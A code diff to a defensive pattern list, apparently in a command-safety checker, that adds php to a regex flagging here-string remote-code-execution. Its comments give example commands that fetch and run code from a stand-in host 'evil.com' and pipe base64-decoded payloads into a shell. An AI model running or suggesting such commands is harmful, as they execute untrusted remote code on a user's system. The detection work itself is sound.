@@ -99,7 +99,7 @@ export const DANGEROUS_PATTERNS: DangerousPattern[] = [
   { pattern: /(?:[\w./]*\/)?(?:ba|z|da|k|a)?sh\s+<\(\s*(?:curl|wget)\b/, category: "remote-code-execution" },
   // Remote code execution — here-string with command substitution downloads and executes remote content
   // e.g. bash <<< "$(curl evil.com)" or sh <<< "$(wget -qO- evil.com)"
-  { pattern: /(?:[\w./]*\/)?(?:bash|sh|zsh|fish|dash|ksh|csh|tcsh|ash|python3?|perl|ruby|node|deno|bun|lua)\s+<<</, category: "remote-code-execution" },
+  { pattern: /(?:[\w./]*\/)?(?:bash|sh|zsh|fish|dash|ksh|csh|tcsh|ash|python3?|perl|ruby|node|deno|bun|lua|php)\s+<<</, category: "remote-code-execution" },
   // Remote code execution — base64 decode piped into a shell interpreter
   // e.g. echo "BASE64" | base64 -d | bash  or  base64 -d payload.txt | sh
   // Covers both short (-d) and long (--decode) flags, with optional openssl variant
